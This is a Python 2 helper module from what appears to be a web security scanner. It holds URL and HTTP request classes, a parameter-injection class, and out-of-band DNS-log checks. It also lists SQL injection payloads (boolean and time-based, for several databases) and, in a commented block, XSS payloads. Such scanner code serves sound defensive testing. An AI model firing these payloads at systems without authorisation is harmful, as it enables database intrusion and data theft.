#!/usr/bin/env pytython
# coding=utf-8

"""
in here, we create some basic class to use like TURL, THTTPJOB,
and some function like is_http and so on

"""
import urlparse
import ssl
import re
import json
import socket
import time
import string
import httplib
import urllib
import redis
import logging
import pymysql
import requests
import requests.packages.urllib3
import hashlib
import mysql
import time
import httplib
import ssl
import urlparse
import random
import requests
from requests import  ConnectTimeout
requests.packages.urllib3.disable_warnings()

logging.getLogger('requests').setLevel(logging.WARNING)

STATIC_EXT = ["f4v","bmp","bz2","css","doc","eot","flv","gif"]
STATIC_EXT += ["gz","ico","jpeg","jpg","js","less","mp3", "mp4"]
STATIC_EXT += ["pdf","png","rar","rtf","swf","tar","tgz","txt","wav","woff","xml","zip"]


BLACK_LIST_PATH = ['logout', 'log-out', 'log_out']


BLACK_LIST_HOST = ['safebrowsing.googleapis.com', 'shavar.services.mozilla.com',]
BLACK_LIST_HOST += ['detectportal.firefox.com', 'aus5.mozilla.org', 'incoming.telemetry.mozilla.org',]
BLACK_LIST_HOST += ['incoming.telemetry.mozilla.org', 'addons.g-fox.cn', 'offlintab.firefoxchina.cn',]
BLACK_LIST_HOST += ['services.addons.mozilla.org', 'g-fox.cn', 'addons.firefox.com.cn',]
BLACK_LIST_HOST += ['versioncheck-bg.addons.mozilla.org', 'firefox.settings.services.mozilla.com']
BLACK_LIST_HOST += ['blocklists.settings.services.mozilla.com', 'normandy.cdn.mozilla.net']
BLACK_LIST_HOST += ['activity-stream-icons.services.mozilla.com', 'ocsp.digicert.com']
BLACK_LIST_HOST += ['safebrowsing.clients.google.com', 'safebrowsing-cache.google.com', 'localhost']
# BLACK_LIST_HOST += ['127.0.0.1']

class TURL(object):
    """docstring for TURL"""
    def __init__(self, url):
        super(TURL, self).__init__()
        self.url = url
        self.format_url()
        self.parse_url()
        if ':' in self.netloc:
            tmp = self.netloc.split(':')
            self.host = tmp[0]
            self.port = int(tmp[1])
        else:
            self.host = self.netloc
            self.port = 80
        if self.start_no_scheme:
            self.scheme_type()

        self.final_url = ''
        self.url_string()

    def parse_url(self):
        parsed_url = urlparse.urlparse(self.url)
        self.scheme, self.netloc, self.path, self.params, self.query, self.fragment = parsed_url

    def format_url(self):
        if (not self.url.startswith('http://')) and (not self.url.startswith('https://')):
            self.url = 'http://' + self.url
            self.start_no_scheme = True
        else:
            self.start_no_scheme = False

    def scheme_type(self):
        if is_http(self.host, self.port) == 'http':
            self.scheme = 'http'

        if is_https(self.host, 443) == 'https':
            self.scheme = 'https'
            self.port = 443

    @property
    def get_host(self):
        return self.host

    @property
    def get_port(self):
        return self.port

    @property
    def get_scheme(self):
        return self.scheme

    @property
    def get_path(self):
        return self.path

    @property
    def get_query(self):
        """
        return query
        """
        return self.query

    @property
    def get_dict_query(self):
        """
        return the dict type query
        """
        return dict(urlparse.parse_qsl(self.query))

    @get_dict_query.setter
    def get_dict_query(self, dictvalue):
        if not isinstance(dictvalue, dict):
            raise Exception('query must be a dict object')
        else:
            self.query = urllib.urlencode(dictvalue)

    @property
    def get_filename(self):
        """
        return url filename
        """
        return self.path[self.path.rfind('/')+1:]

    @property
    def get_ext(self):
        """
        return ext file type
        """
        fname = self.get_filename
        ext = fname.split('.')[-1]
        if ext == fname:
            return ''
        else:
            return ext

    def is_ext_static(self):
        """
        judge if the ext in static file list
        """
        if self.get_ext in STATIC_EXT:
            return True
        else:
            return False

    def is_block_path(self):
        """
        judge if the path in black_list_path
        """
        for p in BLACK_LIST_PATH:
            if p in self.path:
                return True
        else:
            return False

    def url_string(self):
        data = (self.scheme, self.netloc, self.path, self.params, self.query, self.fragment)
        url = urlparse.urlunparse(data)
        self.final_url = url
        return url

    def __str__(self):
        return self.final_url

    def __repr__(self):
        return '<TURL for %s>' % self.final_url



def LogUtil(path='/tmp/test.log', name='test'):
    logging.getLogger('requests').setLevel(logging.WARNING)
    logger = logging.getLogger()
    logger.setLevel(logging.INFO)

    #create formatter
    formatter = logging.Formatter(fmt=u'[%(asctime)s] [%(levelname)s] [%(funcName)s] %(message)s ')

    # create console
    console_handler = logging.StreamHandler()
    console_handler.setFormatter(formatter)

    # create file
    file_handler = logging.FileHandler(path, encoding='utf-8')
    console_handler.setFormatter(formatter)

    logger.addHandler(console_handler)
    logger.addHandler(file_handler)
    return logger


logger = LogUtil()


class THTTPJOB(object):
    """docstring for THTTPJOB"""
    def __init__(self,
                url,
                method='GET',
                data=None,
                files=False,
                filename='',
                filetype='image/png',
                headers=None,
                block_static=True,
                block_path = True,
                allow_redirects=False,
                verify=False,
                timeout = 10,
                is_json=False,
                time_check=True):
        """
        :url: the url to requests,
        :method: the method to request, GET/POST,
        :data: if POST, this is the post data, if upload file, this be the file content
        :files: if upload files, this param is True
        :filename: the upload filename
        :filetype: the uplaod filetype
        :headers: the request headers, it's a dict type,
        :block_static: if true, will not request the static ext url
        :block_path: if true, will not request the path in BLACK_LIST_PATH
        :allow_redirects: if the requests will auto redirects
        :verify: if verify the cert
        :timeout: the request will raise error if more than timeout
        :is_json: if the data is json
        :time_check: if return the check time
        """
        super(THTTPJOB, self).__init__()
        if isinstance(url, TURL):
            self.url = url
        else:
            self.url = TURL(url)

        self.method = method
        self.data = data
        self.files = files
        self.filename = filename
        self.filetype = filetype
        # self.connect_error = False
        self.block_path = block_path
        self_headers = {
            'User-Agent': ('Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko)'
                'Chrome/38.0.2125.111 Safari/537.36 IQIYI Cloud Security Scanner tp_cloud_security[at]qiyi.com'),
            'Connection': 'close',
        }
        self.ConnectionErrorCount = 0
        self.headers = headers if headers else self_headers
        self.block_static = block_static
        self.allow_redirects = allow_redirects
        self.verify = verify
        self.is_json = is_json
        self.timeout = timeout
        if self.method == 'GET':
            self.request_param_dict = self.url.get_dict_query
        else:
            if self.is_json:
                self.request_param_dict = json.loads(self.data)
            else:
                try:
                    self.request_param_dict = dict(urlparse.parse_qsl(self.data))
                except Exception as e:
                    self.request_param_dict = {}

    def request(self):
        """
        return status_code, headers, htmlm, time_check
        """
        if self.block_static and self.url.is_ext_static():
            self.response = requests.Response()
            return -1, {}, '', 0
        elif self.block_path and self.url.is_block_path():

            self.response = requests.Response()
            return -1, {}, '', 0
        elif self.url.get_host in BLACK_LIST_HOST:
            # print "found {} in black list host".format(self.url.get_host)
            self.response = requests.Response()
            return -1, {}, '', 0
        elif self.ConnectionErrorCount >=3 :
            return -1, {}, '', 0

        else:
            start_time = time.time()
            try:
                if self.method == 'GET':
                    self.url.get_dict_query = self.request_param_dict
                    #print "request url: {}".format(self.url.url_string())
                    self.response = requests.get(
                        self.url.url_string(),
                        headers = self.headers,
                        allow_redirects = self.allow_redirects,
                        verify = self.verify,
                        timeout = self.timeout,
                        )
                    end_time = time.time()
                else:
                    if not self.files:
                        self.data = self.request_param_dict
                        self.response = requests.post(
                            self.url.url_string(),
                            data = self.data,
                            headers = self.headers,
                            verify = self.verify,
                            allow_redirects = self.allow_redirects,
                            timeout = self.timeout,
                            )
                    else:
                        # print "------------------"
                        f = {'file' : (self.filename, self.data, self.filetype)}
                        self.response = requests.post(
                            self.url.url_string(),
                            files=f,
                            headers=self.headers,
                            verify=False,
                            allow_redirects=self.allow_redirects,
                            # proxies={'http': '127.0.0.1:8080'},
                            timeout=self.timeout,
                            )
                    end_time = time.time()
            except Exception as e:
                #print "[lib.common] [THTTPJOB.request] {}".format(repr(e))
                end_time = time.time()
                self.ConnectionErrorCount += 1
                return -1, {}, '', 0
            self.time_check = end_time - start_time
            return self.response.status_code, self.response.headers, self.response.content, self.time_check

    def __str__(self):
        return "[THTTPOBJ] method={} url={} data={}".format(self.method, self.url.url_string(), self.data )





def is_http(url, port=None):
    """
    judge if the url is http service
    :url  the host, like www.iqiyi.com, without scheme
    """
    if port is None: port = 80
    service = ''
    try:
        conn = httplib.HTTPConnection(url, port, timeout=10)
        conn.request('HEAD', '/')
        conn.close()
        service = 'http'
    except Exception as e:
        #print "[lib.common] [is_http] {}".format(repr(e))
        pass

    return service

def is_https(url, port=None):
    """
    judge if the url is https request
    :url  the host, like www.iqiyi.com, without scheme
    """
    ssl._create_default_https_context = ssl._create_unverified_context
    if port is None: port = 443
    service = ''
    try:
        conn = httplib.HTTPSConnection(url, port, timeout=10)
        conn.request('HEAD', '/')
        conn.close()
        service = 'https'
    except Exception as e:
        #print "[lib.common] [is_http] {}".format(repr(e))
        pass

    return service


def is_json(data):
    if not data:
        return False
    try:
        json.loads(data)
        return True
    except:
        return False


class Pollution(object):
    """
    this class aim to use the payload
    to the param in requests
    """
    def __init__(self, query, payloads, pollution_all=False, isjson=False, replace=True):
        """
        :query: the url query part
        :payloads:  List, the payloads to added in params
        :data: if url is POST, the data is the post data
        """
        self.payloads = payloads
        self.query = query
        self.isjson = isjson
        self.replace = replace
        self.pollution_all = pollution_all
        self.polluted_urls = []

        if type(self.payloads) != list:
            self.payloads = [self.payloads,]

    def pollut(self):
        if self.isjson:
            query_dict = dict(urlparse.parse_qsl(self.query, keep_blank_values=True))
        else:
            try:
                query_dict = dict(urlparse.parse_qsl(self.query, keep_blank_values=True))
            except Exception as e:
                return
        for key in query_dict.keys():
            for payload in self.payloads:
                tmp_qs = query_dict.copy()
                if self.replace:
                    tmp_qs[key] = payload
                else:
                    tmp_qs[key] = tmp_qs[key] + payload
                self.polluted_urls.append(tmp_qs)

    def payload_generate(self):
        #print self.payloads
        if self.pollution_all:
            pass
        else:
            self.pollut()
            return self.polluted_urls






class Url:

    @staticmethod
    def url_parse(url):
        return urlparse.urlparse(url)

    @staticmethod
    def url_unparse(data):
        scheme, netloc, url, params, query, fragment = data
        if params:
            url = "%s;%s" % (url, params)
        return urlparse.urlunsplit((scheme, netloc, url, query, fragment))

    @staticmethod
    def qs_parse(qs):
        return dict(urlparse.parse_qsl(qs, keep_blank_values=True))

    @staticmethod
    def build_qs(qs):
        return urllib.urlencode(qs).replace('+', '%20')

    @staticmethod
    def urldecode(qs):
        return urllib.unquote(qs)

    @staticmethod
    def urlencode(qs):
        return urllib.quote(qs)


class MySQLUtils():
    host = '127.0.0.1'
    port = 3306
    username = 'root'
    password = ''
    db = 'wyproxy'

    def __init__(self):
        self.conn = pymysql.connect(host=MySQLUtils.host,
                             user=MySQLUtils.username,
                             password=MySQLUtils.password,
                             charset='utf8mb4',
                             db=MySQLUtils.db)

    def insert(self, sql):
        with self.conn.cursor() as cursor:
            cursor.execute(sql)
            self.conn.commit()

    def fetchone(self, sql):
        data = ''
        with self.conn.cursor() as cursor:
            cursor.execute(sql)
            data = cursor.fetchone()
        return data

    def fetchall(self, sql):
        data = []
        with self.conn.cursor() as cursor:
            cursor.execute(sql)
            data = cursor.fetchall()
        return data

    def close(self):
        self.conn.close()


def random_str(length=8):
    s = string.lowercase + string.uppercase + string.digits
    return "".join(random.sample(s, length))



class RedisConf:
    db = '0'
    host = '127.0.0.1'
    password = ''
    port = 6379
    taskqueue = 'queue:task'


REDIS_DB = '0'
REDIS_HOST = '127.0.0.1'
REDIS_PASSWORD = ''
SQLI_TIME_QUEUE = 'time:queue'

class RedisUtil(object):
    def __init__(self, db, host, password='', port=6379):
        self.db = db
        self.host = host
        self.password = password
        # self.taskqueue = taskqueue
        self.port = port
        self.connect()

    def connect(self):
        try:
            self.conn = redis.StrictRedis(
                host=self.host,
                port=self.port,
                db=self.db,
                password=self.password
            )
        except Exception as e:
            print repr(e)
            print "RedisUtil Connection Error"
            self.conn = None
        # finally:
            # return conn


    @property
    def is_connected(self):
        try:
            if self.conn.ping():
                return True
        except:
            print "RedisUtil Object Not Connencd"
            return False


    def task_push(self, queue, data):
        self.conn.lpush(queue, (data))

    def task_fetch(self, queue):
        return self.conn.lpop(queue)


    # @property
    def task_count(self, queue):
        return self.conn.llen(queue)


    def set_exist(self, setqueue, key):
        return self.conn.sismember(setqueue, key)

    def set_push(self, setqueue, key):
        self.conn.sadd(setqueue, key)

    #def close(self):
    #    self.conn.close()

def md5(data):
    m = hashlib.md5()
    m.update(data)
    Hash = m.hexdigest()
    return Hash[8:24]

def http_lib_post(url, payload, headers=None, timeout=10):
    try:
        ssl._create_default_https_context = ssl._create_unverified_context
        if not headers:
            headers = {
                        'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.111 Safari/537.36 IQIYI Cloud Security Scanner tp_cloud_security[at]qiyi.com',
                        'Connection': 'Close'
                      }
        host = urlparse.urlparse(url).netloc
        scheme = urlparse.urlparse(url).scheme
        base = '{0}://{1}'.format(scheme, host)
        path = url.replace(base, '', 1)
        if scheme == 'http':
            conn  = httplib.HTTPConnection(host, timeout=timeout)
        else:
            conn = httplib.HTTPSConnection(host, timeout=timeout)
        conn.request('POST', path, payload, headers)
        resp = conn.getresponse()
        return resp.status, dict(resp.getheaders()), resp.read()
    except Exception, e:
        return -1, {}, ''

def http_lib_get(url, headers=None, timeout=10):
    try:
        ssl._create_default_https_context = ssl._create_unverified_context
        if not headers:
            headers = {
                        'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.111 Safari/537.36 IQIYI Cloud Security Scanner tp_cloud_security[at]qiyi.com',
                        'Connection': 'Close'
                      }
        host = urlparse.urlparse(url).netloc
        scheme = urlparse.urlparse(url).scheme
        base = '{0}://{1}'.format(scheme, host)
        path = url.replace(base, '', 1)
        if scheme == 'http':
            conn  = httplib.HTTPConnection(host, timeout=timeout)
        else:
            conn = httplib.HTTPSConnection(host, timeout=timeout)
        conn.request('GET', path, headers=headers)
        resp = conn.getresponse()
        return resp.status, dict(resp.getheaders()), resp.read()
    except Exception, e:
        return -1, {}, ''

def http_request_post(url, payload, headers=None, timeout=10, body_content_workflow=False, allow_redirects=False, allow_ssl_verify=False, time_check=None):
    try:
        if not headers:
            headers = {
                        'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.111 Safari/537.36 IQIYI Cloud Security Scanner tp_cloud_security[at]qiyi.com',
                        'Connection': 'Close'
                      }
        time0 = time.time()
        result = requests.post(url,
            data=payload,
            headers=headers,
            stream=body_content_workflow,
            timeout=timeout,
            # proxies={'http':'http://127.0.0.1:8090'},
            allow_redirects=allow_redirects,
            verify=allow_ssl_verify)
        time1 = time.time()
        if time_check:
            return result.status_code, result.headers, result.content, time1-time0
        return result.status_code, result.headers, result.content
    except Exception, e:
        #print repr(e)
        if time_check:
            return -1, {}, '', 0
        return -1, {}, ''

def http_request_get(url, headers=None, timeout=10, body_content_workflow=False, allow_redirects=False, allow_ssl_verify=False, time_check=None):
    try:
        if not headers:
            headers = {
                        'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.111 Safari/537.36 IQIYI Cloud Security Scanner tp_cloud_security[at]qiyi.com',
                        'Connection': 'Close'
                      }
        time0 = time.time()
        result = requests.get(url,
            headers=headers,
            stream=body_content_workflow,
            timeout=timeout,
            allow_redirects=allow_redirects,
            verify=allow_ssl_verify)
        time1 = time.time()
        if time_check:
            return result.status_code, result.headers, result.content, time1-time0
        return result.status_code, result.headers, result.content
    except Exception, e:
        if time_check:
            return -1, {}, '', 0
        return -1, {}, ''

def get_remote_keyword():
    return 'True'

def get_remote_domain():
    domain = 'devil.yoyostay.top'
    return domain

def check_remote_dns(domain):
    url = 'http://dnslog.yoyostay.top/api/dns/devil/{0}/'.format(domain[:18])
    code, head, html = http_request_get(url)
    if 'True' in html:
        return True
    return False

def check_remote_web(domain):
    url = 'http://api.ceye.io/v1/records?token=token&type=request&filter={0}'.format(domain[:18])
    code, head, html = http_request_get(url)
    if 'name' in html:
        return True
    return False

def get_headers(url, method, data, headers, proxy_headers=None):
    try:
        cookie = headers.get('Cookie')
        referer = headers.get('Referer')
        useragent = headers.get('User-Agent')
        if not useragent:
            useragent = 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.111 Safari/537.36 IQIYI Cloud Security Scanner tp_cloud_security[at]qiyi.com'
        if not referer:
            referer = url
        headers = {
                    'User-Agent': useragent,
                    'Connection': 'Close',
                    'Cookie': cookie,
                    'Referer': referer
                  }
        if proxy_headers != None:
            headers = proxy_headers
        return headers
    except:
        return {}

def InLog(md5, data):
    try:
        db = mysql.MySQL()
        stime = time.strftime('%Y-%m-%d %H:%M:%S')
        value = [md5, stime, data]
        db.insert('insert into info_blind_log values(NULL,%s,%s,%s)',value)
        db.commit()
        db.close()
    except Exception,e:
        print Exception,":",e
        db.close()

def cookie_filter(key):
    keys = ['__utm', 'PHPSESSID', 'JSESSIONID', 'ASPSESSION', 'ASP.NET_SessionId', 'Hm_l', '_ga']
    for line in keys:
        if line in key:
            return False
    return True

def sqli_bool_payloads():
    payloads = [
                    '%s',
                    ' AND %d=%d',
                    "'AND'%d'='%d",
                    '"AND"%d"="%d',
                    "%%' AND %d=%d AND '%%'='",
                    '%%" AND %d=%d AND "%%"="',
                    ' OR NOT (%d>%d)',
                    "\xbf' OR %d=%d#",

                    ' AND %d=%d-- -',
                    ' AND %d=%d#',
                    ') AND %d=%d-- -',
                    ') AND %d=%d#',
                    "' AND %d=%d-- -",
                    "' AND %d=%d#",
                    "') AND %d=%d-- -",
                    "') AND %d=%d#",

                    ' OR NOT (%d>%d)-- -',
                    ' OR NOT (%d>%d)#',
                    ') OR NOT (%d>%d)-- -',
                    ') OR NOT (%d>%d)#',
                    "' OR NOT (%d>%d)-- -",
                    "' OR NOT (%d>%d)#",
                    "') OR NOT (%d>%d)-- -",
                    "') OR NOT (%d>%d)#",
               ]
    return payloads

def sqli_time_payloads():
    payloads = [
                    ' AND (SELECT * FROM (SELECT(SLEEP(TIMESLEEP)))zpGO)',
                    "' AND (SELECT * FROM (SELECT(SLEEP(TIMESLEEP)))zpGO) AND '22'='22",
                    ') AND (SELECT * FROM (SELECT(SLEEP(TIMESLEEP)))zpGO) AND (22=22',
                    "') AND (SELECT * FROM (SELECT(SLEEP(TIMESLEEP)))zpGO) AND ('22'='22",
                    "%' AND (SELECT * FROM (SELECT(SLEEP(TIMESLEEP)))zpGO) AND '%'='",
                    " AND (SELECT * FROM (SELECT(SLEEP(TIMESLEEP)))zpGO)-- -",
                    ",(SELECT*FROM(SELECT(SLEEP(TIMESLEEP)))zpGO)",
                    ",(SELECT*FROM(SELECT(SLEEP(TIMESLEEP)))zpGO)as1",
                    "\xbf' AND (SELECT * FROM (SELECT(SLEEP(TIMESLEEP)))zpGO)#",

                    " WAITFOR DELAY '0:0:TIMESLEEP'",
                    "' WAITFOR DELAY '0:0:TIMESLEEP' AND '22'='22",
                    ") WAITFOR DELAY '0:0:TIMESLEEP' AND (2=2",
                    "') WAITFOR DELAY '0:0:TIMESLEEP' AND ('22'='22",
                    "%' WAITFOR DELAY '0:0:TIMESLEEP' AND '%'='",
                    " WAITFOR DELAY '0:0:TIMESLEEP'-- -",

                    " AND 8096=DBMS_PIPE.RECEIVE_MESSAGE(CHR(102)||CHR(113)||CHR(86)||CHR(102),TIMESLEEP)",
                    "' AND 8096=DBMS_PIPE.RECEIVE_MESSAGE(CHR(102)||CHR(113)||CHR(86)||CHR(102),TIMESLEEP) AND '22'='22",
                    ") AND 8096=DBMS_PIPE.RECEIVE_MESSAGE(CHR(102)||CHR(113)||CHR(86)||CHR(102),TIMESLEEP) AND (22=22",
                    "') AND 8096=DBMS_PIPE.RECEIVE_MESSAGE(CHR(102)||CHR(113)||CHR(86)||CHR(102),TIMESLEEP) AND ('22'='22",
                    "%' AND 8096=DBMS_PIPE.RECEIVE_MESSAGE(CHR(102)||CHR(113)||CHR(86)||CHR(102),TIMESLEEP) AND '%'='",
                    " AND 8096=DBMS_PIPE.RECEIVE_MESSAGE(CHR(102)||CHR(113)||CHR(86)||CHR(102),TIMESLEEP)-- -",

                    " AND 3112=(SELECT 3112 FROM PG_SLEEP(TIMESLEEP))",
                    "' AND 3112=(SELECT 3112 FROM PG_SLEEP(TIMESLEEP)) AND '22'='22",
                    ") AND 3112=(SELECT 3112 FROM PG_SLEEP(TIMESLEEP)) AND (22=22",
                    "') AND 3112=(SELECT 3112 FROM PG_SLEEP(TIMESLEEP)) AND ('22'='22",
                    "%' AND 3112=(SELECT 3112 FROM PG_SLEEP(TIMESLEEP)) AND '%'='",
                    " AND 3112=(SELECT 3112 FROM PG_SLEEP(TIMESLEEP))-- -",

                    ";(SELECT * FROM (SELECT(SLEEP(TIMESLEEP)))IiMY)#",
                    "';(SELECT * FROM (SELECT(SLEEP(TIMESLEEP)))IiMY)#",
                    ");(SELECT * FROM (SELECT(SLEEP(TIMESLEEP)))IiMY)#",
                    "');(SELECT * FROM (SELECT(SLEEP(TIMESLEEP)))IiMY)#",
                    "%';(SELECT * FROM (SELECT(SLEEP(TIMESLEEP)))IiMY)#",

                    ";WAITFOR DELAY '0:0:TIMESLEEP'--",
                    "';WAITFOR DELAY '0:0:TIMESLEEP'--",
                    ");WAITFOR DELAY '0:0:TIMESLEEP'--",
                    "');WAITFOR DELAY '0:0:TIMESLEEP'--",
                    "%';WAITFOR DELAY '0:0:TIMESLEEP'--",

                    ";SELECT DBMS_PIPE.RECEIVE_MESSAGE(CHR(108)||CHR(73)||CHR(85)||CHR(118),TIMESLEEP) FROM DUAL--",
                    "';SELECT DBMS_PIPE.RECEIVE_MESSAGE(CHR(108)||CHR(73)||CHR(85)||CHR(118),TIMESLEEP) FROM DUAL--",
                    ");SELECT DBMS_PIPE.RECEIVE_MESSAGE(CHR(108)||CHR(73)||CHR(85)||CHR(118),TIMESLEEP) FROM DUAL--",
                    "');SELECT DBMS_PIPE.RECEIVE_MESSAGE(CHR(108)||CHR(73)||CHR(85)||CHR(118),TIMESLEEP) FROM DUAL--",
                    "%';SELECT DBMS_PIPE.RECEIVE_MESSAGE(CHR(108)||CHR(73)||CHR(85)||CHR(118),TIMESLEEP) FROM DUAL--",

                    ";SELECT PG_SLEEP(TIMESLEEP)--",
                    "';SELECT PG_SLEEP(TIMESLEEP)--",
                    ");SELECT PG_SLEEP(TIMESLEEP)--",
                    "');SELECT PG_SLEEP(TIMESLEEP)--",
                    "%';SELECT PG_SLEEP(TIMESLEEP)--",
               ]
    return payloads




if __name__ == '__main__':
    '''
    file = 'img.png'
    filetype='image/png'
    data="data"

    hj2 = THTTPJOB('www.iqiyi.com', method='POST', files=True, filename=file, data=data)
    hj2.request()
    assert hj2.response.status_code == 200

    xss = [
        "\" onfous=alert(document.domain)\"><\"",
        "\"`'></textarea><audio/onloadstart=confirm`1` src>",
        "\"</script><svg onload=alert`1`>",
        # "\"`'></textarea><audio/onloadstart=confirm`1` src>",
    ]

    url = 'http://www.iqiyi.com/path/?p=v&p2=v2'
    query = 'p=v&p2=v2'
    print Pollution(query, xss).payload_generate()
    '''
    url = 'http://www.baidu.com/v1/?a=b&c=e'
    url  = TURL(url)
    print ''.join(url.get_dict_query.keys())
